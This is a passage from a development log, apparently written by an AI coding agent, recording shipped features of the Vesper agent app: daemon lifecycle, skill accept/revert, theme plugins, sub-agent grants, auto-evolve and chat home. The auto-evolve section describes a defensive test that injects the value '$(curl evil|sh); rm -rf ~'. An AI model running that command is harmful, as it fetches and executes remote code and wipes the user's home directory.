  `status` (IPC ping + PID/uptime/version), `install`/`uninstall` (macOS launchd LaunchAgent).
- Pure logic TDD'd: `daemon-lifecycle.ts` (PID read/write/remove, `resolveDaemonState` with injectable
  liveness probe → running/stale/stopped) + `launchd.ts` (`renderLaunchAgentPlist`, XML-escaped,
  RunAtLoad+KeepAlive). Audit: `daemon_started`/`daemon_stopped` reuse the existing `events` table
  (no new "audit log" subsystem — the issue's separate audit file was unnecessary).
- ADAPTED AWAY (pre-pivot, N/A): JSON-RPC `ask`/`vault.*` IPC methods, llm_router, `packages/daemon`.
  Kept the existing newline-JSON ping IPC + the in-process scheduler/UI host. CLI shape changed:
  bare `vesper daemon` → `vesper daemon run`/`start` (better UX, no `&`); README + docs/ui.md + the
  `vesper ui` hint updated; command table regenerated.
- Verified live end-to-end: status(stopped)→start(PID, detached)→status(running,uptime,version)→
  pidfile@0600+socket→stop(SIGTERM,cleanup)→status(stopped); single-instance guard ("already running");
  audit events confirmed in the events table.
- DEFERRED gate (noted on the issue): live `launchctl load` + reboot-survival NOT run autonomously —
  a KeepAlive LaunchAgent pointing at a relative dev entrypoint would crash-loop; a real install needs
  an absolute `vesper` path (`bun link`). Plist generation is unit-tested. 514 tests / 0 fail; biome clean.

## Linear backlog triage (Omar goal: "all issues completed or cancelled")

DEV-89 completed (above). Cancelled as superseded by the bring-your-own-CLI + elder-first pivot
(reversible, per-issue reasons on each): DEV-93 (macOS-Shortcuts capture), DEV-94 (Whisper/@xenova
voice — superseded by `specs/voice-modalities.md`), DEV-36/90/98/99 (M4 external-adapter platform +
SDK + Hermes adapter), DEV-100 (pre-pivot launch — superseded by `specs/installer-distribution.md`).
DEV-13 + DEV-48 cancellation was BLOCKED by the permission classifier (auto-cancelling issues the
agent didn't create) — left in Backlog for Omar. Net: Vesper project is all-terminal except those two.

## Forge design + Slice 4 (evolve-skills accept/revert) — SHIPPED

Omar's vision: "Vesper auto-codes new features by itself + evolves skills and features." Designed via
two multi-agent workflows: (1) a 6-direction Vesper World UI design panel (Hearth-Cottage chosen —
see `specs/elder-first-ui-redesign.md`); (2) a 5-facet + security-adversary + architect design of the
self-build/evolve capability -> `specs/forge-self-build-evolve.md` ("Forge"). Omar's post-SPEC
decisions: CREATE-local + evolve-skills first; BLOCK forge code-execution until a robust cross-platform
sandbox exists; NETWORK_FETCH hard-blocked v1; elder = wishes + watch only. The sandbox block gates the
CREATE execution path (Slices 5-7), so the buildable increment was Slice 4.

- **Built (the deferred skill-train T7):** `vesper skill accept <name>` adopts the trained `best.md`
  into the committed `.ai/skills/<name>/SKILL.md`, and `vesper skill revert <name>` restores it. Core
  is a pure, injected-deps `acceptBest`/`revertSkill` (`skill-train/accept.ts`, test-first) over new
  append-only checkpoint methods on `SkillTrainStore`. No untrusted code execution -> safe under the
  sandbox block.
- **Security spine (the must-fix constraints, encoded):** human ack before any overwrite (full diff
  shown; non-TTY refuses without `--yes`); the prior committed bytes are checkpointed BEFORE the write
  (git-independent rollback); checkpoints are APPEND-ONLY — written with `wx`, probing the next free
  integer slot, so a same-ms `Date.now()` or a backward clock can never overwrite history (Hard rule 4,
  never rm); `skill_promoted`/`skill_reverted` audit events (best-effort, never fails the action);
  `assertSkillName` enforced at both command entrypoints (path-traversal boundary, not incidental);
  committed bytes read ONCE (closes the diff->write TOCTOU); cycle-log checkpoint ref is home-relative
  (no `/Users/<name>` PII in a committed file).
- **REVIEW:** 3-lens fan-out (code-reviewer + security-auditor + test-engineer). Security + tests =
  ship; correctness = revise (the checkpoint-overwrite high + audit-kind medium). All fixed, including
  the test-engineer's coverage gaps: multi-magnitude numeric-sort test (catches lexicographic
  regression), append-only file-survival assertion, same-`at` collision-keeps-both, stray-file-ignored,
  and a real-fs accept->revert byte-fidelity round-trip (trailing newline / multibyte / blank line).
- **DELTA vs spec:** v1 `revert` restores the LATEST checkpoint only (selecting an older one is a
  follow-up) — noted in the spec. 529 tests / 0 fail (+15 for this slice); Biome clean; no provider SDKs.
- **Next:** Hearth-Cottage UI build (approved, queued); the robust cross-platform sandbox sub-spec that
  unblocks Forge CREATE (Slices 5-7).

## Vesper World redesign (Hearth-Cottage) + pluggable renderer + logo registry — SHIPPED

Two design workflows drove this: a 6-direction elder-first UI design panel (Hearth-Cottage chosen,
`specs/elder-first-ui-redesign.md`) and a render-plugin/cyberpunk design (`specs/pluggable-renderer.md`).
Omar then redirected: the UI must be a PLUGGABLE renderer (pick how you see your agents) where EVERY
agent shows its real brand logo; Hearth-Cottage is theme #1, cyberpunk is theme #2 (prompt in the spec,
to be generated via claude.ai then ported). Decisions: per-theme logo framing (Hearth keeps wool
creatures for pipelines, logo on the live lantern; cyberpunk shows a logo for every node); cyberpunk
ships dev-only until an a11y/contrast review.

- **Hearth-Cottage look** (presentation-layer only; buildWorld/server/127.0.0.1/SceneGraph FROZEN):
  cottage room baked offscreen (60fps win), animated fire + embers, braided rug, dusk window; the 9x9
  sprite re-skinned as warm WOOL creatures; gentle non-alarming error (a "?" + a color-INDEPENDENT
  "needs a look" chip); a live visitor carries a LANTERN with its brand emblem; warm "note by the fire"
  inspect card with a 64px portrait well + 56px Run; Georgia serif title; prefers-reduced-motion honored.
  Verified end-to-end in a real browser.
- **Slice 1 — brand/logo registry** (`client/brand/`): a TOTAL `resolveMark()` that never returns null
  (presence-prefix -> exact -> prefix -> substring -> Vesper-default), so the always-a-logo invariant is
  structural. Built-ins claude/codex(OpenAI knot)/gemini/opencode/zeroclaw + hermes/ironclaw + the
  Vesper "V" fallback. `emblems.ts` retired; `render.ts` lantern resolves through it.
- **Slice 2 — WorldTheme plugin seam** (`client/theme/` + `client/themes/`): the `WorldTheme` contract
  (id, displayName, the existing drawScene signature), a `THEME_REGISTRY` mirroring ModuleRegistry +
  `resolveTheme` (unknown -> default, never throws), Hearth registered as the default theme, `main.ts`
  renders via `activeTheme.drawScene`. Behavior-preserving (verified no visual regression live).
- DEFERRED: Slice 3 (theme switching UX — config `ui.theme` + `?theme=` + elder picker) and Slice 4
  (port the cyberpunk theme once its index.html is generated from the prompt). 544 tests / 0 fail
  (+10: brand + theme registries); Biome clean; bundles; no provider SDKs. docs/ui.md update folded
  into Slice 3 (themes documented there).

## Pluggable renderer Slice 3 — theme selection — SHIPPED

Theme switching plumbing (selectable themes), per `specs/pluggable-renderer.md`:
- `client/theme-store.ts` (pure, tested): `pickThemeId` precedence URL `?theme=` > localStorage >
  server `<meta name="vesper-theme">` > registry default; `readUrlTheme` + storage/meta readers.
- config: `ui.theme` in `~/.vesper/config.json` (`normalizeUi`, drop-on-invalid); daemon threads it
  to `startUiServer({ defaultTheme })`; the server stamps a sanitized `<meta>` hint into the served
  HTML (shell templating only — `/api/world` untouched).
- `vesper ui --theme <id>` opens `?theme=<id>` (browser remembers it); `--theme` added to the
  dispatch VALUE_FLAGS allowlist. `main.ts` resolves the active theme via theme-store at load.
- DEFERRED to Slice 4: the in-page elder theme PICKER overlay (a one-option picker has no value
  until cyberpunk lands as theme #2). 545 tests / 0 fail (+6 theme-store); Biome clean; bundles;
  CLI docs + README regenerated; live smoke green (unknown `?theme=` falls back, no error).

## Sub-agent orchestration backbone — per-task grants (mig 005) + orchestration & live trace (mig 006) — SHIPPED

`specs/vesper-personal-agent.md` umbrella, build slices 1-2 (`per-task-capability-grants.md`,
`agent-orchestration-and-trace.md`). No Linear issue (workspace issue-capped) -> this entry + the commit
are the record (Rule 11 fallback). Built by a multi-phase workflow, then verified + hardened by an
adversarial review workflow whose NEEDS_FIXES verdict drove the fix pass below.

- **Per-task grants (mig 005_task_grants):** `SPAWN_SUBAGENT` added (capability union -> 9, deny-by-default);
  `scheduler.register()` writes a per-task grant (= declared `required_capabilities`) and enforces a CEILING
  (grant SHALL be a subset of the host union, else `grant_exceeds_ceiling`); `#invoke` now gates on the
  per-task grant (deny-by-default when no grant row) IN ADDITION to the host-union ceiling — a low-trust
  pipeline no longer inherits another's caps. Built-in parity preserved. `store.{upsertTaskGrant,
  getTaskGrant}` keyed by `(handler_id, content_hash)`.
- **Orchestration + live trace (mig 006):** `runs.parent_run_id` + `status_updated_at` + `run_events`.
  `ctx.spawn(descriptor)` runs registered handlers as in-process depth-1 children (two-sided cap gate:
  descriptor caps ⊆ parent grant AND ⊆ host ceiling; `subagent_depth` + `maxFanout` guards); the run row
  opens UP FRONT (`startRun` "running") so the tree is live the instant a child spawns. `ctx.emitProgress`
  + `RUN_EVENT` bus -> `server.publish("agent:<runId>")` + a lite `world` pulse; `withTimeout`/
  `remainingBudgetMs` factored into `timeout.ts`. UI: WS subscribe/unsubscribe (UUID-guarded) + replay
  routes `GET /api/runs/:id/{events,tree}` (local-origin guarded) + a client activity-panel renderer.
- **Review-and-fix pass:** (a) strict-`tsc` compile — a closure-mutated `let recorded` narrowed to `never`
  (suite was green only because `bun:test`/CI don't run `tsc`); fixed via a ref object + `startRun` query
  tuple + test-mock completeness. (b) double-finalize that clobbered a handler-committed run status on a
  later throw -> `rowFinalized` gate (scheduler + subagent). (c) live `RUN_EVENT` frames now carry the
  persisted `id` + `ts` (were undefined, so the client de-dupe dropped every step after the first); the
  `complete` trace event is now persisted/replayable. (d) write-side `appendRunEvent` kind guard. Added
  regression tests for the load-bearing UNTESTED invariants: child RUNTIME capability narrowing (a mutation
  letting a child inherit the parent grant previously left all tests green), record-then-throw status
  preservation, and a genuine pre-006 row reading back `parent_run_id` NULL.
- VERIFIED FALSE POSITIVE: the capability-denial early return runs BEFORE `startRun`, so no "running" row
  is stranded (the review's must-fix #6 did not hold against the actual code).
- 613 tests / 0 fail (+4 over the as-built 609); Biome clean; no NEW tsc errors (16 PRE-EXISTING
  Bun-vs-tsc friction errors remain in unrelated files; CI runs biome + bun test, not tsc); no provider SDKs.
- DEFERRED (need Omar's call / tied to the chatbot-home UI redesign): client per-CHILD trace backfill +
  `agent:<childRunId>` subscribe (the server contract is correct; only the canvas renderer fetches
  root-only); `task_grants` keyed by handler_id vs task id (two tasks sharing a handler collide — a
  design + migration decision); `emitProgress` redaction under `redactSummaries` (no spec SHALL); the
  `/events` oldest-500 backfill cap.

## Auto-evolve pipeline — scheduled reflect -> propose -> gated-additive skill acquisition — SHIPPED

`specs/auto-evolve.md` (requirement #5 auto-evolve + #6 elegant+secure of the personal-agent reframe).
No Linear issue (workspace issue-capped) -> this entry + the commit are the record (Rule 11 fallback).
A proposal-only + gated-additive vertical that ships standalone — depends only on SHIPPED seams
(per-task grants, the `events` table, the scheduler cron path, the injectable `ProcessRunner`), NOT on
the still-blocked forge sandbox (it executes no LLM-generated code).

- **New `auto-evolve` core module (`vesper-core/src/auto-evolve/`, all pure, 100% lines):**
  `skill-name.ts` (the security linchpin — `isAllowedSkillName`: `^[a-z0-9][a-z0-9-]{0,63}$` + an
  allowlisted `owner/` source prefix, `unknown`-typed so it guards the runtime boundary); `gather.ts`
  (`gatherSignals` — windows `Store.listRuns` + `TaskPersistence.{listFailedTasks,list}` by `sinceMs`,
  rolls up error runs by pipeline, builds a deterministic, length-capped digest — each error field
  collapsed + capped to mitigate prompt-injection); `reflect.ts` (`buildReflectPrompt` — frames the
  digest inside an explicit UNTRUSTED-DATA fence, modeled on skill-train's `buildOptimizerPrompt`);
  `parse.ts` (`parseEvolveReport` — fenced-JSON closed shape, FAIL-CLOSED `{ok}` result, never throws,
  never `eval`, drops malformed proposal entries).
- **`PROCESS_RUN` capability (10th value, union + tuple + `isCapability`):** a distinct, dangerous
  side effect no existing cap covered (FS_WRITE = files, NETWORK_FETCH = HTTP). The DEFAULT task omits
  it, so the out-of-the-box build literally cannot shell out. Persists into the existing
  `task_grants`/`scheduled_tasks` TEXT columns — no DDL, no migration.
- **`ctx.readSignals(opts)` read seam (READ_STORAGE-gated, on `PipelineContext`):** returns a FROZEN
  `EvolveSignals` snapshot (not the live Store), so a handler cannot read past its window or write
  through it. Mirrors the `recordRun`/`emitProgress` capability-gate template; the scheduler passes its
  `TaskPersistence` handle into `buildPipelineContext` (new optional `taskPersistence` dep; absent ->
  failed-task/last-error sections read empty, run-derived signals still work).
- **`auto-evolve` pipeline (`packages/pipelines/auto-evolve/`):** factory `createAutoEvolveHandler(deps)`
  closes over injected `appendEvent` + `runProcess` seams (so the unit suite shells out to nothing and
  writes no real DB); the default-registered `autoEvolveHandler` opens the store lazily per write +
  uses the real `runProcess`. Stage 3 writes one `report` + one `skill_proposal`/skill +
  one `fix_proposal`/fix to `events` under `source:"auto-evolve"` (reuse the events table, no migration).
  Acquisition runs `bunx skills add <name> --yes` ONLY when (a) `acquire=true`, (b) the task declares
  PROCESS_RUN (else `assertCapabilities` throws before any process), and (c) the name passes
  `isAllowedSkillName` (a failing name -> `acquire_skipped` audit, never executed); the name is a
  discrete `args[]` element (no shell string). Cron `0 3 * * *`, `enabled:false` (opt-in),
  `max_runs_per_day:1`, `max_duration_ms:300000`; default cap set is proposal-only.
- **`vesper evolve list` (read-only CLI):** renders the latest `report` + open skill/fix proposals via
  `listEvents({source:"auto-evolve"})`. CLI glue — no TDD (Hard rule 7).
- SAFETY HELD: proposal-only for code (handler writes ZERO files; `fix_proposal` is the explicit hand-off
  to the human-gated software-engineer pipeline); gated-additive-only for skills; untrusted `last_error`
  reaches the prompt only as framed, capped data and reaches NO process invocation — proven by a test
  that injects `$(curl evil|sh); rm -rf ~` as both a `last_error` and an echoed skill name and asserts
  the runner is never called.
- 667 tests / 0 fail (+ the auto-evolve suite: skill-name, gather, parse/reflect, context readSignals,
  scheduler end-to-end readSignals, handler); auto-evolve core 100% lines, handler 95% (the only
  uncovered span is the FS-coupled default store-opening closure, intentionally not unit-tested); Biome
  clean; no NEW tsc errors (same 16 PRE-EXISTING Bun-vs-tsc friction errors in unrelated files); no
  provider SDKs in `bun.lock`.
- DEFERRED (per spec Out of Scope): applying `fix_proposal`s (software-engineer pipeline); authoring
  pipeline CODE (forge, blocked on the sandbox); `NETWORK_FETCH`; a RAG/embedding index over signals;
  an elder-surface approval tile; auto-running skill-train on a newly acquired skill.

## Chatbot home + editable pipeline templates (#9 + #4) — SHIPPED

`specs/chatbot-home.md`. The post-onboarding HOME is a simple chatbot; the canvas demotes to a side
activity panel. Built on the SHIPPED orchestration+trace backbone (consumed, not modified). No Linear
issue (issue-capped) -> specs/ + this entry + the commit are the record (Rule 11). Built by a
Backend->Client->Review workflow; the review's 2 real HIGH gaps were then fixed by the lead.

- **Storage (migration `007_chat_home`):** `chat_sessions`, `chat_turns`, `pipeline_templates` + index;
  6 synchronous `Store` methods (createSession, appendTurn, listSessions, listTurns, getTemplate,
  upsertTemplate) mirroring the existing JSON/assert helpers. `chat_turns.run_id` links an assistant
  turn to the run that produced it (transcript bubble == activity-tree root, same data two ways).
- **Router pipeline (`packages/pipelines/router/`):** a chat message is a manual `scheduler.run("router",
  {params})` (the EXISTING run path — no new execution). The handler classifies via `ctx.complete` to ONE
  label, maps it through a FIXED ALLOWLIST to a registered handler id, and `ctx.spawn`s it; an
  unmapped/free-form label -> a clarify turn (NO spawn, no dynamic id — preserves no-eval). caps
  [CLI_INVOKE, WRITE_STORAGE, SPAWN_SUBAGENT].
- **Routes + WS:** `POST /api/chat`, `GET /api/chat/sessions`, `GET /api/chat/sessions/:id/turns`,
  `GET /api/pipelines`, `GET|PUT /api/pipelines/:id/template`; a `chat:<sessionId>` WS topic next to the
  backbone's `agent:<runId>` (one socket, UUID-guarded). Client: transcript home + demoted activity
  panel (reuses the runTree render) + a templates screen; reduced-motion + WCAG-AA honored.
- **Security:** a minimal out-of-band approval-token module (`vesper-core/src/approval/`, CSPRNG
  single-use) gates `PUT /template`; `POST /api/approval/request` mints a code and prints it to the daemon
  TTY (out-of-band — never in the HTTP response, so a local app can mint but not read it). The future
  `security-hardening.md` adopts this seam. `POST /api/chat` is isLocalRequest-only (deliberate parity
  with the existing run route, so the canvas Run button still works).
- **Lead fixes over the workflow output** (2 real HIGHs the review caught): (1) `mint()` had NO production
  caller -> added the `/api/approval/request` mint path + test, so template editing actually works
  end-to-end; (2) the router ignored template `default_params` -> it now MERGES the target's editable
  default_params UNDER the user message (injected via `registerPipelines({getDefaultParams})` -> daemon
  wires `store.getTemplate`), so an edited template configures its runs (#4). + router/server tests.
- 724 tests / 0 fail (+ chatbot suite + the 2 fix tests); Biome clean; no NEW tsc errors (same 16
  pre-existing); no provider SDKs.
- NOTED (not blocking): `PUT /template` persists prompt/params only — schedule/caps stay editable via
  `vesper schedule` (the spec's Design-Decisions/Acceptance contradict each other; took the conservative
  path). Migration `007_chat_home` takes the next free id; the umbrella ledger's planning reservation
  (007=rag) shifts to 008/009 for rag/eval (gitignored planning doc, reconciled at their build).
- DEFERRED (per spec Out of Scope): the security-hardening §C token formalization; multi-session history
  UX; capability editing from the templates UI; token-level streaming.

---

## Desktop shell redesign — premium dark-glass native companion + Vesper World rebuild — SHIPPED

- Specs: `specs/desktop-app-shell.md` + `specs/vesper-world-rebuild.md` (Omar-authorized 2026-06-02; record
  surface = specs + this log; Linear issue cap active). Reference look: OpenClaw Windows Companion.
- **Decisions locked (Omar):** premium dark-glass SUPERSEDES the elder-first *visual* framing (Hard rule 14
  amendment pending on a later sync); primary section name = **Pipelines**; presence/echo MOVES to
  Diagnostics (not deleted); built shell + rebuilt Chat together as slice 1.
- **What shipped:** the `@vesper/ui` client is now an app shell — custom draggable titlebar (Cmd+E command
  search, live status pills off `/api/status`), grouped sidebar, a client-side `SectionRouter`, and a
  chrome-only theme system (dark default; light/hearth opt-in) that REPLACES the canvas-coupled `WorldTheme`.
  14 sections: Chat + Runtime/CLIs/Permissions/Sandbox/Settings/Diagnostics/About (live) + Pipelines/
  Channels/Schedule (thin) + Skills/Memory/Voice (honest stubs naming their specs).
- **Vesper World rebuilt:** the pixel-art canvas + machine-wide presence home are RETIRED (controlled
  `git rm`, recoverable). Chat = transcript + a Vesper-ONLY activity rail (follows the conversation's run
  tree via the existing `/api/chat` + run-trace APIs; subscribe-before-backfill + de-dupe preserved). No
  backend rewrite — reused chat/router/sessions/turns verbatim.
- **Server:** new read-only `/api/status`, `/api/presence`, `/api/runs`; `/api/world` + `snapshot.ts` removed;
  presence poll kept (feeds `/api/presence` for Diagnostics).
- **Native:** macOS overlay titlebar (`TitleBarStyle::Overlay` + `hidden_title`, cfg-gated to macOS) so the
  custom HTML titlebar shows with the traffic lights inset; tray + single-instance from DEV-112 slice 3.
- **Parallel build:** lead built the backbone + Chat + real sections + server routes; 2 sub-agents built the
  6 thin views + the Rust overlay window concurrently (file-disjoint). Net **-890 lines** tracked in vesper-ui.
- **Gotcha (cost a runtime crash Omar caught):** the browser client is bundled by Bun (which does NOT error
  on an undefined identifier) and sits OUTSIDE the root tsc program, so a section referenced in the barrel
  but never imported (`sandboxSection`) only failed at runtime in the browser — green tests + clean bundle
  missed it. FIX + GUARD: `sections/index.test.ts` imports the barrel and asserts ALL_SECTIONS (14, unique
  ids, valid shape). Lesson: for the browser client, an import-the-barrel test is the real typecheck.
- Verified: `biome ci` clean (2 cosmetic warnings), vesper-ui 46 / vesper-cli 104 pass, no new tsc errors in
  touched files, compiled sidecar serves the new shell end-to-end. No provider SDKs.
- DEFERRED: privileged config writes from Settings (theme is client-side; default-CLI read-only); full
  template editing in Pipelines (read-only view); Windows/Linux window chrome (macOS-first per Omar); the
  one `!important` (reduced-motion) biome warning; the menu-bar popover app + internal-pipelines auto-skills
  feature (next requests).

---

## Agent context-window visibility (orchestrator + sub-agents) — SHIPPED

- Spec: `specs/agent-context-window.md` (local; Linear issue cap active — spec + this log + commit are the
  record, Rule 11). Authorized by Omar 2026-06-04. Parallels the Claude Code statusline HUD built the same
  day (`~/.claude/statusline-context.ts`): the same context-fill signal, now on Vesper's OWN runs in the
  Chat activity rail.
- What shipped: a per-run context pill (`ctx <bar> <pct>%`, green/amber/red/bright by fill) on the
  orchestrator row AND each sub-agent row.
  - CAPTURE (cli): `CompleteResult.usage?` + a `parseOutput` hook on BaseAdapter; the Claude adapter now runs
    `claude -p --output-format json` and unwraps `{ result, usage }` (graceful fallback to plain text + no
    usage on any non-JSON / old-CLI output — never throws).
  - RECORD (scheduler): `ctx.complete` records the LATEST completion's prompt size (input + cache tokens,
    matching the HUD; output excluded) via `store.recordRunContext` + a `usage` run_event + a RUN_EVENT bus
    emit, all best-effort (a capture failure can never break a completion). Sub-agents inherit it for free
    (same `buildPipelineContext`). New core helper `contextWindowFor(model)` (1m hint -> 1M, else 200k).
  - PERSIST (storage): migration `008_run_context` (ctx_used_tokens/ctx_limit/ctx_model on `runs`),
    `recordRunContext`, `RunEventKind` += `usage`, optional `RunRow.context`.
  - EXPOSE/RENDER (ui): `RunTreeInfo.run.context` + server tree map; the activity rail renders the pill from
    the tree snapshot and updates it live from `usage` frames (already published generically — zero new
    server WS code), excluding `usage` from the step log.
- Decisions (Omar): latest-completion metric; "ctx --" for CLIs that report no usage (no estimation);
  compact header pill; Claude `--output-format json`.
- Parallel build: lead pre-defined the shared types, then ran T1 (cli) + T2 (storage) as two file-disjoint
  sub-agents concurrently; lead integrated T3 (scheduler) + T4 (server) + T5 (rail) and owned the barrel
  re-exports.
- Gotchas: (1) `exactOptionalPropertyTypes` rejects assigning `undefined` to optional props — used
  conditional spreads for `usage` + cache fields. (2) Making `RunRow.context` REQUIRED broke partial RunRow
  literals in tests (gather/context) — made it optional (`context?`), which the store mapper always fills.
  (3) Completions now emit a `usage` world pulse, so a WS test that grabbed the FIRST frame had to filter for
  `run:completed`.
- Verified: 762 tests / 0 fail (+29); Biome clean (2 pre-existing `!important` warnings); tsc 31 = exact
  merge baseline (0 new); no provider SDKs (usage parsed from the user's own CLI). DEFERRED: live browser
  visual verify of the pill (data path is integration-tested server-side); a peak-vs-latest toggle; usage
  for non-Claude CLIs that do not emit it.
